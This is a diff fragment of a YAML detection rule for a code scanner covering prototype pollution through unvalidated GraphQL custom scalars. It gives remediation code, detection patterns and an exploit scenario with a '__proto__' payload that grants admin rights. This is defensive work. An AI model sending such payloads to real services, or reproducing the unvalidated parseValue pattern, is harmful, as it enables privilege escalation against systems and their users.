+      - Authorization bypass through crafted scalar values
+      - Cross-service attacks in federated GraphQL architectures
+    remediation: |
+      1. Validate all inputs in custom scalar parseValue:
+         ```javascript
+         const SafeJSONScalar = new GraphQLScalarType({
+           name: 'SafeJSON',
+           parseValue(value) {
+             if (typeof value !== 'object' || value === null) {
+               throw new TypeError('Expected object value');
+             }
+             // Strip dangerous keys
+             const clean = JSON.parse(JSON.stringify(value));
+             delete clean.__proto__;
+             delete clean.constructor;
+             return clean;
+           },
+           parseLiteral(ast) {
+             if (ast.kind !== Kind.OBJECT_VALUE) {
+               throw new TypeError('Expected object literal');
+             }
+             return parseLiteralSafe(ast);
+           }
+         });
+         ```
+      2. Use graphql-scalars library for standard scalar types.
+      3. Implement input validation in resolvers as defense-in-depth.
+      4. Use GraphQL schema directives for input constraints.
+      5. Avoid using the generic JSON scalar for typed data.
+    references:
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://graphql.org/learn/schema/#scalar-types"
+      - "https://the-guild.dev/graphql/scalars"
+    context_awareness:
+      surrounding_context_patterns:
+        - "GraphQLScalarType definition in schema file"
+        - "parseValue without validation logic"
+        - "JSON.parse in scalar type processing"
+        - "Scalar used in mutation input types"
+      taint_source_indicators:
+        - "GraphQL variables object"
+        - "Inline GraphQL argument values"
+        - "Subscription event payload"
+        - "Apollo Server context"
+      taint_sink_indicators:
+        - "parseValue return value used in resolver"
+        - "Database query with scalar-parsed value"
+        - "Object spread from scalar result"
+        - "Event emission with scalar-parsed data"
+      sanitization_patterns:
+        - "Type checking in parseValue"
+        - "Schema validation on parsed result"
+        - "Whitelist-based key filtering"
+        - "AST kind checking in parseLiteral"
+    severity_scoring:
+      severity_weight: 7
+      risk_score_formula_hint: "severity_weight * confidence * (json_scalar_used ? 1.3 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A GraphQL API uses a custom JSON scalar type for flexible input in
+        a mutation that updates user preferences. The parseValue function
+        simply returns the input value without validation:
+        parseValue: (value) => value
+        An attacker sends a mutation with a variable containing:
+        {"preferences": {"__proto__": {"isAdmin": true}}}
+        The scalar passes this through to the resolver, which spreads it
+        into the user object. Object.prototype is polluted, and all
+        subsequent authorization checks that look for user.isAdmin find
+        true, granting admin access to the attacker.
+      example_payload: '{"__proto__": {"isAdmin": true, "role": "admin"}}'
+      attacker_objective: "Inject malicious objects through GraphQL custom scalar deserialization to achieve privilege escalation"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JS-001"
+        - "DESER-JS-007"
+        - "DESER-JS-005"
